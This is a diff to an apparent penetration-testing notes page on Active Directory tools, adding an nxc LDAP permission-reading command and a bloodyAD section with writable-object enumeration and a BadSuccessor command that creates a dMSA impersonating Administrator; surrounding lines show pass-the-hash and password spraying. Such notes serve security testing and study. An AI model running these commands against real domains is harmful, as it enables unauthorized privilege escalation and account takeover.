@@ -340,6 +340,7 @@ crackmapexec smb 10.0.0.5 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8
         
     - Remote execution via SMB/WMI/WinRM.
         
+4. Handles **LDAP signing** automatically — important against modern DCs (Server 2025+) that enforce signing and reject unsigned queries from tools like raw `ldapsearch`.
 
 **Requires:** Null session or valid domain creds/hashes.
 
@@ -349,10 +350,47 @@ crackmapexec smb 10.0.0.5 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8
 nxc smb 10.0.0.5 --shares
 nxc smb 10.0.0.0/24 -u users.txt -p passwords.txt
 nxc smb 10.0.0.5 -u user -p pass --exec-method smbexec
+# LDAP DACL enumeration (useful for finding exploitable OU permissions)
+nxc ldap DC_IP -u USER -p PASS -d domain.local -M daclread -o TARGET_DN="OU=SomeOU,DC=domain,DC=local" ACTION=read
 ```
 
 **Transport Stack:**  
-`SMB (445), MSRPC (135), WinRM (5985/5986), WMI (135)`
+`SMB (445), MSRPC (135), WinRM (5985/5986), WMI (135), LDAP (389)`
+
+---
+
+## bloodyAD
+
+**Flow:**
+
+1. Python-based AD Swiss Army knife for enumeration and exploitation.
+    
+2. Handles **LDAP signing** and **channel binding** automatically.
+    
+3. Key capabilities:
+    
+    - **Enumeration:** Find writable attributes, OU permissions, DACL analysis.
+        
+    - **Exploitation:** BadSuccessor attack, DACL abuse, attribute manipulation.
+        
+4. Installed via `uv tool install --python 3.13 git+https://github.com/CravateRouge/bloodyAD`.
+
+**Requires:** Valid domain creds.
+
+**Example Commands:**
+
+```bash
+# Find all objects you can write to or create children in
+bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN get writable --detail
+
+# Execute BadSuccessor attack (create dMSA impersonating Administrator)
+bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN add badSuccessor dmsa_name
+```
+
+See [[BadSuccessor Attack]] for the full exploitation chain.
+
+**Transport Stack:**  
+`LDAP (389/tcp), LDAPS (636/tcp)`
 
 ---
 
